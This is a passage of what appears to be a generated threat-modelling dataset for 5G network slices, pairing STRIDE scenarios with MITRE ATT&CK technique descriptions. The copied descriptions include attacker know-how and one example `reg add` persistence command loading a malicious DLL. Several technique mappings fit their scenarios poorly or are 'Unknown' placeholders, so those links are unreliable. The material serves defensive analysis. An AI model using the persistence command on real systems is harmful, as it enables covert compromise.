                "data interception"
            ],
            "mitre_technique": {
                "name": "Virtual Private Server",
                "description": "Adversaries may compromise third-party Virtual Private Servers (VPSs) that can be used during targeting. There exist a variety of cloud service providers that will sell virtual machines/containers as a service. Adversaries may compromise VPSs purchased by third-party entities. By compromising a VPS to use as infrastructure, adversaries can make it difficult to physically tie back operations to themselves.(Citation: NSA NCSC Turla OilRig)\n\nCompromising a VPS for use in later stages of the adversary lifecycle, such as Command and Control, can allow adversaries to benefit from the ubiquity and trust associated with higher reputation cloud service providers as well as that added by the compromised third-party.",
                "id": "attack-pattern--39cc9f64-cf74-4a48-a4d8-fe98c54a02e0",
                "technique_id": "T1584.003"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "Attackers gain access to VNFs and alter the settings or code to disrupt services.",
            "Assumptions": [
                {
                    "Assumption": "Inadequate access controls and monitoring for VNFs.",
                    "Role": "System administrator",
                    "Condition": "Due to default settings or insufficient security policies."
                },
                {
                    "Assumption": "Attackers have gained privileged access through social engineering or exploits.",
                    "Role": "Cyber attacker",
                    "Condition": "With insider access or exploiting vulnerabilities."
                },
                {
                    "Assumption": "Lack of integrity checks on VNF configurations and code.",
                    "Role": "Security engineer",
                    "Condition": "Due to oversight or performance trade-offs."
                }
            ],
            "Potential Impact": "Service disruption and potential data loss.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "VNF",
                "service disruption",
                "configuration alteration"
            ],
            "mitre_technique": {
                "name": "Disable or Modify Tools",
                "description": "Adversaries may modify and/or disable security tools to avoid possible detection of their malware/tools and activities. This may take many forms, such as killing security software processes or services, modifying / deleting Registry keys or configuration files so that tools do not operate properly, or other methods to interfere with security tools scanning or reporting information. Adversaries may also disable updates to prevent the latest security patches from reaching tools on victim systems.(Citation: SCADAfence_ransomware)\n\nAdversaries may also tamper with artifacts deployed and utilized by security tools. Security tools may make dynamic changes to system components in order to maintain visibility into specific events. For example, security products may load their own modules and/or modify those loaded by processes to facilitate data collection. Similar to [Indicator Blocking](https://attack.mitre.org/techniques/T1562/006), adversaries may unhook or otherwise modify these features added by tools (especially those that exist in userland or are otherwise potentially accessible to adversaries) to avoid detection.(Citation: OutFlank System Calls)(Citation: MDSec System Calls) \n\nAdversaries may also focus on specific applications such as Sysmon. For example, the \u201cStart\u201d and \u201cEnable\u201d values in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Microsoft-Windows-Sysmon-Operational</code> may be modified to tamper with and potentially disable Sysmon logging.(Citation: disable_win_evt_logging) \n\nOn network devices, adversaries may attempt to skip digital signature verification checks by altering startup configuration files and effectively disabling firmware verification that typically occurs at boot.(Citation: Fortinet Zero-Day and Custom Malware Used by Suspected Chinese Actor in Espionage Operation)(Citation: Analysis of FG-IR-22-369)\n\nIn cloud environments, tools disabled by adversaries may include cloud monitoring agents that report back to services such as AWS CloudWatch or Google Cloud Monitor.\n\nFurthermore, although defensive tools may have anti-tampering mechanisms, adversaries may abuse tools such as legitimate rootkit removal kits to impair and/or disable these tools.(Citation: chasing_avaddon_ransomware)(Citation: dharma_ransomware)(Citation: demystifying_ryuk)(Citation: doppelpaymer_crowdstrike) For example, adversaries have used tools such as GMER to find and shut down hidden processes and antivirus software on infected systems.(Citation: demystifying_ryuk)\n\nAdditionally, adversaries may exploit legitimate drivers from anti-virus software to gain access to kernel space (i.e. [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068)), which may lead to bypassing anti-tampering features.(Citation: avoslocker_ransomware)",
                "id": "attack-pattern--ac08589e-ee59-4935-8667-d845e38fe579",
                "technique_id": "T1562.001"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "Manipulation of orchestration and management commands leading to incorrect resource allocation.",
            "Assumptions": [
                {
                    "Assumption": "Weak authentication and authorization mechanisms for orchestration systems.",
                    "Role": "System administrator",
                    "Condition": "During deployment or due to policy deficiencies."
                },
                {
                    "Assumption": "Attackers have access to orchestration command interfaces.",
                    "Role": "Cyber attacker",
                    "Condition": "Through credential theft or network compromise."
                },
                {
                    "Assumption": "Monitoring and auditing of orchestration commands are insufficient.",
                    "Role": "Security analyst",
                    "Condition": "Due to budget constraints or technical limitations."
                }
            ],
            "Potential Impact": "Resource exhaustion and service degradation.",
            "MITRE ATT&CK Keywords": [
                "orchestration",
                "resource allocation",
                "command manipulation",
                "service degradation"
            ],
            "mitre_technique": {
                "name": "Additional Container Cluster Roles",
                "description": "An adversary may add additional roles or permissions to an adversary-controlled user or service account to maintain persistent access to a container orchestration system. For example, an adversary with sufficient permissions may create a RoleBinding or a ClusterRoleBinding to bind a Role or ClusterRole to a Kubernetes account.(Citation: Kubernetes RBAC)(Citation: Aquasec Kubernetes Attack 2023) Where attribute-based access control (ABAC) is in use, an adversary with sufficient permissions may modify a Kubernetes ABAC policy to give the target account additional permissions.(Citation: Kuberentes ABAC)\n \nThis account modification may immediately follow [Create Account](https://attack.mitre.org/techniques/T1136) or other malicious account activity. Adversaries may also modify existing [Valid Accounts](https://attack.mitre.org/techniques/T1078) that they have compromised.  \n\nNote that where container orchestration systems are deployed in cloud environments, as with Google Kubernetes Engine, Amazon Elastic Kubernetes Service, and Azure Kubernetes Service, cloud-based  role-based access control (RBAC) assignments or ABAC policies can often be used in place of or in addition to local permission assignments.(Citation: Google Cloud Kubernetes IAM)(Citation: AWS EKS IAM Roles for Service Accounts)(Citation: Microsoft Azure Kubernetes Service Service Accounts) In these cases, this technique may be used in conjunction with [Additional Cloud Roles](https://attack.mitre.org/techniques/T1098/003).",
                "id": "attack-pattern--35d30338-5bfa-41b0-a170-ec06dfd75f64",
                "technique_id": "T1098.006"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "Modification of trust boundaries to create unauthorized access points.",
            "Assumptions": [
                {
                    "Assumption": "Deficient segmentation and isolation in the trust boundary configurations.",
                    "Role": "Network architect",
                    "Condition": "Due to complex network designs or misconfigurations."
                },
                {
                    "Assumption": "Attackers possess knowledge of trust boundary details.",
                    "Role": "Cyber attacker",
                    "Condition": "Through insider threats or reconnaissance."
                },
                {
                    "Assumption": "Lack of real-time monitoring and alerting for changes to trust boundaries.",
                    "Role": "Security analyst",
                    "Condition": "Due to insufficient tools or resource allocation."
                }
            ],
            "Potential Impact": "Unauthorized network access and potential data breach.",
            "MITRE ATT&CK Keywords": [
                "trust boundary",
                "access points",
                "segmentation",
                "unauthorized access"
            ],
            "mitre_technique": {
                "name": "Network Boundary Bridging",
                "description": "Adversaries may bridge network boundaries by compromising perimeter network devices or internal devices responsible for network segmentation. Breaching these devices may enable an adversary to bypass restrictions on traffic routing that otherwise separate trusted and untrusted networks.\n\nDevices such as routers and firewalls can be used to create boundaries between trusted and untrusted networks.  They achieve this by restricting traffic types to enforce organizational policy in an attempt to reduce the risk inherent in such connections.  Restriction of traffic can be achieved by prohibiting IP addresses, layer 4 protocol ports, or through deep packet inspection to identify applications.  To participate with the rest of the network, these devices can be directly addressable or transparent, but their mode of operation has no bearing on how the adversary can bypass them when compromised.\n\nWhen an adversary takes control of such a boundary device, they can bypass its policy enforcement to pass normally prohibited traffic across the trust boundary between the two separated networks without hinderance.  By achieving sufficient rights on the device, an adversary can reconfigure the device to allow the traffic they want, allowing them to then further achieve goals such as command and control via [Multi-hop Proxy](https://attack.mitre.org/techniques/T1090/003) or exfiltration of data via [Traffic Duplication](https://attack.mitre.org/techniques/T1020/001). Adversaries may also target internal devices responsible for network segmentation and abuse these in conjunction with [Internal Proxy](https://attack.mitre.org/techniques/T1090/001) to achieve the same goals.(Citation: Kaspersky ThreatNeedle Feb 2021)  In the cases where a border device separates two separate organizations, the adversary can also facilitate lateral movement into new victim environments.",
                "id": "attack-pattern--b8017880-4b1e-42de-ad10-ae7ac6705166",
                "technique_id": "T1599"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "Attackers manipulate logs and audit trails to cover their tracks after unauthorized access.",
            "Assumptions": [
                {
                    "Assumption": "Logs and audit trails are stored in locations without adequate protection.",
                    "Role": "System administrator",
                    "Condition": "During configuration or due to policy gaps."
                },
                {
                    "Assumption": "Attackers have obtained privileged access.",
                    "Role": "Cyber attacker",
                    "Condition": "Through exploits or insider threats."
                },
                {
                    "Assumption": "Insufficient validation and integrity checks on logs and audits.",
                    "Role": "Security engineer",
                    "Condition": "Due to lack of controls or oversight."
                }
            ],
            "Potential Impact": "Loss of monitoring and forensic capabilities.",
            "MITRE ATT&CK Keywords": [
                "log manipulation",
                "audit trails",
                "cover tracks",
                "repudiation"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "Users perform unauthorized actions and deny responsibility due to lack of transaction logging.",
            "Assumptions": [
                {
                    "Assumption": "System does not enforce non-repudiation mechanisms.",
                    "Role": "System architect",
                    "Condition": "During design phase or for performance reasons."
                },
                {
                    "Assumption": "Users have capabilities to perform actions without proper logging.",
                    "Role": "End-user",
                    "Condition": "Due to permission abuses or system flaws."
                },
                {
                    "Assumption": "Audit trails are not immutable or are easily altered.",
                    "Role": "System administrator",
                    "Condition": "Due to misconfiguration or lack of protections."
                }
            ],
            "Potential Impact": "Lack of accountability and traceability.",
            "MITRE ATT&CK Keywords": [
                "non-repudiation",
                "transaction logging",
                "unauthorized actions",
                "accountability"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "Administrators execute unauthorized changes and later deny their involvement.",
            "Assumptions": [
                {
                    "Assumption": "Administrative actions are not thoroughly logged.",
                    "Role": "System administrator",
                    "Condition": "Due to lack of logging policies or resource constraints."
                },
                {
                    "Assumption": "No multi-factor authentication for critical administrative functions.",
                    "Role": "Network administrator",
                    "Condition": "During setup or due to policy gaps."
                },
                {
                    "Assumption": "Logs can be modified or deleted without detection.",
                    "Role": "Cyber attacker",
                    "Condition": "With administrative or elevated access levels."
                }
            ],
            "Potential Impact": "Compromised system integrity and lack of auditability.",
            "MITRE ATT&CK Keywords": [
                "administrative actions",
                "change denial",
                "log alteration",
                "system integrity"
            ],
            "mitre_technique": {
                "name": "Registry Run Keys / Startup Folder",
                "description": "Adversaries may achieve persistence by adding a program to a startup folder or referencing it with a Registry run key. Adding an entry to the \"run keys\" in the Registry or startup folder will cause the program referenced to be executed when a user logs in.(Citation: Microsoft Run Key) These programs will be executed under the context of the user and will have the account's associated permissions level.\n\nThe following run keys are created by default on Windows systems:\n\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce</code>\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code>\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce</code>\n\nRun keys may exist under multiple hives.(Citation: Microsoft Wow6432Node 2018)(Citation: Malwarebytes Wow6432Node 2016) The <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx</code> is also available but is not created by default on Windows Vista and newer. Registry run key entries can reference programs directly or list them as a dependency.(Citation: Microsoft Run Key) For example, it is possible to load a DLL at logon using a \"Depend\" key with RunOnceEx: <code>reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d \"C:\\temp\\evil[.]dll\"</code> (Citation: Oddvar Moe RunOnceEx Mar 2018)\n\nPlacing a program within a startup folder will also cause that program to execute when a user logs in. There is a startup folder location for individual user accounts as well as a system-wide startup folder that will be checked regardless of which user account logs in. The startup folder path for the current user is <code>C:\\Users\\\\[Username]\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup</code>. The startup folder path for all users is <code>C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp</code>.\n\nThe following Registry keys can be used to set startup folder items for persistence:\n\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders</code>\n* <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders</code>\n* <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders</code>\n\nThe following Registry keys can control automatic startup of services during boot:\n\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce</code>\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices</code>\n\nUsing policy settings to specify startup programs creates corresponding values in either of two Registry keys:\n\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run</code>\n\nPrograms listed in the load value of the registry key <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows</code> run automatically for the currently logged-on user.\n\nBy default, the multistring <code>BootExecute</code> value of the registry key <code>HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager</code> is set to <code>autocheck autochk *</code>. This value causes Windows, at startup, to check the file-system integrity of the hard disks if the system has been shut down abnormally. Adversaries can add other programs or processes to this registry value which will automatically launch at boot.\n\nAdversaries can use these configuration locations to execute malware, such as remote access tools, to maintain persistence through system reboots. Adversaries may also use [Masquerading](https://attack.mitre.org/techniques/T1036) to make the Registry entries look as if they are associated with legitimate programs.",
                "id": "attack-pattern--9efb1ea7-c37b-4595-9640-b7680cd84279",
                "technique_id": "T1547.001"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Sensitive data intercepted through unsecured external interfaces.",
            "Assumptions": [
                {
                    "Assumption": "External interfaces lack encryption or utilize weak encryption standards.",
                    "Role": "Network administrator",
                    "Condition": "During deployment or upgrade periods."
                },
                {
                    "Assumption": "Attackers have access to intercept traffic.",
                    "Role": "Cyber attacker",
                    "Condition": "Through compromised network devices or eavesdropping."
                },
                {
                    "Assumption": "No additional data obfuscation or masking practices are employed.",
                    "Role": "Security architect",
                    "Condition": "Due to implementation challenges or performance impacts."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of sensitive information.",
            "MITRE ATT&CK Keywords": [
                "data interception",
                "external communication",
                "unencrypted data",
                "sensitive information"
            ],
            "mitre_technique": {
                "name": "Exfiltration Over Alternative Protocol",
                "description": "Adversaries may steal data by exfiltrating it over a different protocol than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server.  \n\nAlternate protocols include FTP, SMTP, HTTP/S, DNS, SMB, or any other network protocol not being used as the main command and control channel. Adversaries may also opt to encrypt and/or obfuscate these alternate channels. \n\n[Exfiltration Over Alternative Protocol](https://attack.mitre.org/techniques/T1048) can be done using various common operating system utilities such as [Net](https://attack.mitre.org/software/S0039)/SMB or FTP.(Citation: Palo Alto OilRig Oct 2016) On macOS and Linux <code>curl</code> may be used to invoke protocols such as HTTP/S or FTP/S to exfiltrate data from a system.(Citation: 20 macOS Common Tools and Techniques)\n\nMany IaaS and SaaS platforms (such as Microsoft Exchange, Microsoft SharePoint, GitHub, and AWS S3) support the direct download of files, emails, source code, and other sensitive information via the web console or [Cloud API](https://attack.mitre.org/techniques/T1059/009).",
                "id": "attack-pattern--a19e86f8-1c0a-4fea-8407-23b73d615776",
                "technique_id": "T1048"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Compromise of VNFs leading to exposure of user data processed within the slice.",
            "Assumptions": [
                {
                    "Assumption": "VNFs process sensitive user data without additional encryption.",
                    "Role": "System architect",
                    "Condition": "Due to design decisions or performance reasons."
                },
                {
                    "Assumption": "Attackers have access to compromised VNFs.",
                    "Role": "Cyber attacker",
                    "Condition": "Through exploiting vulnerabilities or social engineering."
                },
                {
                    "Assumption": "No integrity checks on VNF binaries and configurations.",
                    "Role": "Security engineer",
                    "Condition": "Due to oversight or resource allocation limitations."
                }
            ],
            "Potential Impact": "Exposure of confidential user information.",
            "MITRE ATT&CK Keywords": [
                "VNF compromise",
                "user data exposure",
                "sensitive information",
                "data breach"
            ],
            "mitre_technique": {
                "name": "Cloud Instance Metadata API",
                "description": "Adversaries may attempt to access the Cloud Instance Metadata API to collect credentials and other sensitive data.\n\nMost cloud service providers support a Cloud Instance Metadata API which is a service provided to running virtual instances that allows applications to access information about the running virtual instance. Available information generally includes name, security group, and additional metadata including sensitive data such as credentials and UserData scripts that may contain additional secrets. The Instance Metadata API is provided as a convenience to assist in managing applications and is accessible by anyone who can access the instance.(Citation: AWS Instance Metadata API) A cloud metadata API has been used in at least one high profile compromise.(Citation: Krebs Capital One August 2019)\n\nIf adversaries have a presence on the running virtual instance, they may query the Instance Metadata API directly to identify credentials that grant access to additional resources. Additionally, adversaries may exploit a Server-Side Request Forgery (SSRF) vulnerability in a public facing web proxy that allows them to gain access to the sensitive information via a request to the Instance Metadata API.(Citation: RedLock Instance Metadata API 2018)\n\nThe de facto standard across cloud service providers is to host the Instance Metadata API at <code>http[:]//169.254.169.254</code>.\n",
                "id": "attack-pattern--19bf235b-8620-4997-b5b4-94e0659ed7c3",
                "technique_id": "T1552.005"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Insufficient isolation between network slices leading to data leakage.",
            "Assumptions": [
                {
                    "Assumption": "Shared resources between slices without strict isolation mechanisms.",
                    "Role": "Network architect",
                    "Condition": "During resource optimization or misconfiguration."
                },
                {
                    "Assumption": "Attackers gain access to one slice and leverage it to compromise others.",
                    "Role": "Cyber attacker",
                    "Condition": "Through exploiting vulnerabilities or misconfigurations."
                },
                {
                    "Assumption": "Monitoring mechanisms do not detect inter-slice communications.",
                    "Role": "Security analyst",
                    "Condition": "Due to lack of tools or insufficient resources."
                }
            ],
            "Potential Impact": "Data leakage across isolations leading to widespread data exposure.",
            "MITRE ATT&CK Keywords": [
                "isolation breakdown",
                "data leakage",
                "slice crossover",
                "information exposure"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "DDoS attack on the orchestration and management system causing resource allocation failures.",
            "Assumptions": [
                {
                    "Assumption": "Lack of DDoS protection mechanisms on critical management interfaces.",
                    "Role": "Network administrator",
                    "Condition": "During setup or due to cost-saving measures."
                },
                {
                    "Assumption": "Attackers can generate high volumes of traffic to overwhelm the system.",
                    "Role": "Cyber attacker",
                    "Condition": "Using botnets or other amplification techniques."
                },
                {
                    "Assumption": "No redundancy or failover mechanisms for orchestration services.",
                    "Role": "System architect",
                    "Condition": "Due to design choices or insufficient funding."
                }
            ],
            "Potential Impact": "Resource allocation failures and service disruption.",
            "MITRE ATT&CK Keywords": [
                "DDoS",
                "orchestration system",
                "resource allocation",
                "service disruption"
            ],
            "mitre_technique": {
                "name": "Network Denial of Service",
                "description": "Adversaries may perform Network Denial of Service (DoS) attacks to degrade or block the availability of targeted resources to users. Network DoS can be performed by exhausting the network bandwidth services rely on. Example resources include specific websites, email services, DNS, and web-based applications. Adversaries have been observed conducting network DoS attacks for political purposes(Citation: FireEye OpPoisonedHandover February 2016) and to support other malicious activities, including distraction(Citation: FSISAC FraudNetDoS September 2012), hacktivism, and extortion.(Citation: Symantec DDoS October 2014)\n\nA Network DoS will occur when the bandwidth capacity of the network connection to a system is exhausted due to the volume of malicious traffic directed at the resource or the network connections and network devices the resource relies on. For example, an adversary may send 10Gbps of traffic to a server that is hosted by a network with a 1Gbps connection to the internet. This traffic can be generated by a single system or multiple systems spread across the internet, which is commonly referred to as a distributed DoS (DDoS).\n\nTo perform Network DoS attacks several aspects apply to multiple methods, including IP address spoofing, and botnets.\n\nAdversaries may use the original IP address of an attacking system, or spoof the source IP address to make the attack traffic more difficult to trace back to the attacking system or to enable reflection. This can increase the difficulty defenders have in defending against the attack by reducing or eliminating the effectiveness of filtering by the source address on network defense devices.\n\nFor DoS attacks targeting the hosting system directly, see [Endpoint Denial of Service](https://attack.mitre.org/techniques/T1499).",
                "id": "attack-pattern--d74c4a7e-ffbf-432f-9365-7ebf1f787cab",
                "technique_id": "T1498"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Excessive resource consumption on a network slice leading to service degradation.",
            "Assumptions": [
                {
                    "Assumption": "Resource limits are not strictly enforced within slices.",
                    "Role": "System architect",
                    "Condition": "During configuration or due to policy gaps."
                },
                {
                    "Assumption": "Attackers exploit legitimate functionalities to consume resources.",
                    "Role": "Cyber attacker",
                    "Condition": "Through crafted requests or malicious workloads."
                },
                {
                    "Assumption": "Monitoring for resource usage anomalies is insufficient.",
                    "Role": "Security analyst",
                    "Condition": "Due to lack of tools or resource constraints."
                }
            ],
            "Potential Impact": "Service degradation or complete service unavailability.",
            "MITRE ATT&CK Keywords": [
                "resource consumption",
                "network slice",
                "service degradation",
                "denial of service"
            ],
            "mitre_technique": {
                "name": "Application Exhaustion Flood",
                "description": "Adversaries may target resource intensive features of applications to cause a denial of service (DoS), denying availability to those applications. For example, specific features in web applications may be highly resource intensive. Repeated requests to those features may be able to exhaust system resources and deny access to the application or the server itself.(Citation: Arbor AnnualDoSreport Jan 2018)",
                "id": "attack-pattern--18cffc21-3260-437e-80e4-4ab8bf2ba5e9",
                "technique_id": "T1499.003"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Edge computing nodes targeted with high traffic volumes causing latency issues.",
            "Assumptions": [
                {
                    "Assumption": "Edge nodes lack sufficient traffic management controls.",
                    "Role": "Network administrator",
                    "Condition": "Due to configuration errors or hardware limitations."
                },
                {
                    "Assumption": "Attackers generate high traffic volumes to overwhelm the nodes.",
                    "Role": "Cyber attacker",
                    "Condition": "Using botnets or distributed traffic sources."
                },
                {
                    "Assumption": "No redundancy or load balancing mechanisms for edge nodes.",
                    "Role": "System architect",
                    "Condition": "Due to cost considerations or design choices."
                }
            ],
            "Potential Impact": "Increased latency and potential service outages.",
            "MITRE ATT&CK Keywords": [
                "traffic overload",
                "edge computing",
                "latency issues",
                "service outage"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Exploitation of vulnerabilities in VNFs to gain higher privileged access.",
            "Assumptions": [
                {
                    "Assumption": "VNFs have unpatched vulnerabilities.",
                    "Role": "System administrator",
                    "Condition": "Due to delayed updates or lacking vulnerability management."
                },
                {
                    "Assumption": "Attackers can discover and exploit these vulnerabilities.",
                    "Role": "Cyber attacker",
                    "Condition": "With access to relevant tools and expertise."
                },
                {
                    "Assumption": "No additional privilege restrictions beyond initial authentication.",
                    "Role": "Network architect",
                    "Condition": "Due to design or performance considerations."
                }
            ],
            "Potential Impact": "Unauthorized actions and potential system control.",
            "MITRE ATT&CK Keywords": [
                "vulnerability exploitation",
                "VNF",
                "privileged access",
                "unauthorized actions"
            ],
            "mitre_technique": {
                "name": "Direct Cloud VM Connections",
                "description": "Adversaries may leverage [Valid Accounts](https://attack.mitre.org/techniques/T1078) to log directly into accessible cloud hosted compute infrastructure through cloud native methods. Many cloud providers offer interactive connections to virtual infrastructure that can be accessed through the [Cloud API](https://attack.mitre.org/techniques/T1059/009), such as Azure Serial Console(Citation: Azure Serial Console), AWS EC2 Instance Connect(Citation: EC2 Instance Connect)(Citation: lucr-3: Getting SaaS-y in the cloud), and AWS System Manager.(Citation: AWS System Manager).\n\nMethods of authentication for these connections can include passwords, application access tokens, or SSH keys. These cloud native methods may, by default, allow for privileged access on the host with SYSTEM or root level access. \n\nAdversaries may utilize these cloud native methods to directly access virtual infrastructure and pivot through an environment.(Citation: SIM Swapping and Abuse of the Microsoft Azure Serial Console) These connections typically provide direct console access to the VM rather than the execution of scripts (i.e., [Cloud Administration Command](https://attack.mitre.org/techniques/T1651)).",
                "id": "attack-pattern--45241b9e-9bbc-4826-a2cc-78855e51ca09",
                "technique_id": "T1021.008"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Manipulation of orchestration and management systems to gain administrative access.",
            "Assumptions": [
                {
                    "Assumption": "Weak authentication mechanisms for orchestration interfaces.",
                    "Role": "Network administrator",
                    "Condition": "Due to default configurations or policy gaps."
                },
                {
                    "Assumption": "Attackers can bypass or exploit these authentication mechanisms.",
                    "Role": "Cyber attacker",
                    "Condition": "Using technical tools or social engineering."
                },
                {
                    "Assumption": "Insufficient monitoring of privileged actions within orchestration systems.",
                    "Role": "Security analyst",
                    "Condition": "Due to tool limitations or resource constraints."
                }
            ],
            "Potential Impact": "Full administrative control and manipulation of network slices.",
            "MITRE ATT&CK Keywords": [
                "orchestration manipulation",
                "administrative access",
                "privilege escalation",
                "network control"
            ],
            "mitre_technique": {
                "name": "Additional Cloud Roles",
                "description": "An adversary may add additional roles or permissions to an adversary-controlled cloud account to maintain persistent access to a tenant. For example, adversaries may update IAM policies in cloud-based environments or add a new global administrator in Office 365 environments.(Citation: AWS IAM Policies and Permissions)(Citation: Google Cloud IAM Policies)(Citation: Microsoft Support O365 Add Another Admin, October 2019)(Citation: Microsoft O365 Admin Roles) With sufficient permissions, a compromised account can gain almost unlimited access to data and settings (including the ability to reset the passwords of other admins).(Citation: Expel AWS Attacker)\n(Citation: Microsoft O365 Admin Roles) \n\nThis account modification may immediately follow [Create Account](https://attack.mitre.org/techniques/T1136) or other malicious account activity. Adversaries may also modify existing [Valid Accounts](https://attack.mitre.org/techniques/T1078) that they have compromised. This could lead to privilege escalation, particularly if the roles added allow for lateral movement to additional accounts.\n\nFor example, in AWS environments, an adversary with appropriate permissions may be able to use the <code>CreatePolicyVersion</code> API to define a new version of an IAM policy or the <code>AttachUserPolicy</code> API to attach an IAM policy with additional or distinct permissions to a compromised user account.(Citation: Rhino Security Labs AWS Privilege Escalation)\n\nIn some cases, adversaries may add roles to adversary-controlled accounts outside the victim cloud tenant. This allows these external accounts to perform actions inside the victim tenant without requiring the adversary to [Create Account](https://attack.mitre.org/techniques/T1136) or modify a victim-owned account.(Citation: Invictus IR DangerDev 2024)",
                "id": "attack-pattern--2dbbdcd5-92cf-44c0-aea2-fe24783a6bc3",
                "technique_id": "T1098.003"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Exploitation of insufficient isolation between trusted zones to gain elevated privileges.",
            "Assumptions": [
                {
                    "Assumption": "Trusted zones are not adequately isolated or segmented.",
                    "Role": "Network architect",
                    "Condition": "Due to misconfiguration or optimization efforts."
                },
                {
                    "Assumption": "Attackers have access to a low-privileged zone and exploit trust boundary weaknesses.",
                    "Role": "Cyber attacker",
                    "Condition": "Through reconnaissance or vulnerability exploitation."
                },
                {
                    "Assumption": "Trust boundary changes are not adequately monitored.",
                    "Role": "Security engineer",
                    "Condition": "Due to insufficient tools or policies."
                }
            ],
            "Potential Impact": "Movement to higher privilege zones and potential full system compromise.",
            "MITRE ATT&CK Keywords": [
                "zone isolation",
                "privilege escalation",
                "trusted zones",
                "system compromise"
            ],
            "mitre_technique": {
                "name": "Escape to Host",
                "description": "Adversaries may break out of a container to gain access to the underlying host. This can allow an adversary access to other containerized resources from the host level or to the host itself. In principle, containerized resources should provide a clear separation of application functionality and be isolated from the host environment.(Citation: Docker Overview)\n\nThere are multiple ways an adversary may escape to a host environment. Examples include creating a container configured to mount the host\u2019s filesystem using the bind parameter, which allows the adversary to drop payloads and execute control utilities such as cron on the host; utilizing a privileged container to run commands or load a malicious kernel module on the underlying host; or abusing system calls such as `unshare` and `keyctl` to escalate privileges and steal secrets.(Citation: Docker Bind Mounts)(Citation: Trend Micro Privileged Container)(Citation: Intezer Doki July 20)(Citation: Container Escape)(Citation: Crowdstrike Kubernetes Container Escape)(Citation: Keyctl-unmask)\n\nAdditionally, an adversary may be able to exploit a compromised container with a mounted container management socket, such as `docker.sock`, to break out of the container via a [Container Administration Command](https://attack.mitre.org/techniques/T1609).(Citation: Container Escape) Adversaries may also escape via [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068), such as exploiting vulnerabilities in global symbolic links in order to access the root directory of a host machine.(Citation: Windows Server Containers Are Open)\n\nGaining access to the host may provide the adversary with the opportunity to achieve follow-on objectives, such as establishing persistence, moving laterally within the environment, accessing other containers running on the host, or setting up a command and control channel on the host.",
                "id": "attack-pattern--4a5b7ade-8bb5-4853-84ed-23f262002665",
                "technique_id": "T1611"
            }
        }
    ]
},
{
    "case_number": "3",
    "batch_number": "17",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker creates a fake network slice to impersonate legitimate services.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has network access.",
                    "Role": "Attacker",
                    "Condition": "True if the attacker gains any form of network access."
                },
                {
                    "Assumption": "The system lacks robust authentication for network slice creation.",
                    "Role": "System",
                    "Condition": "True if the system does not enforce strict authentication and authorization checks."
                }
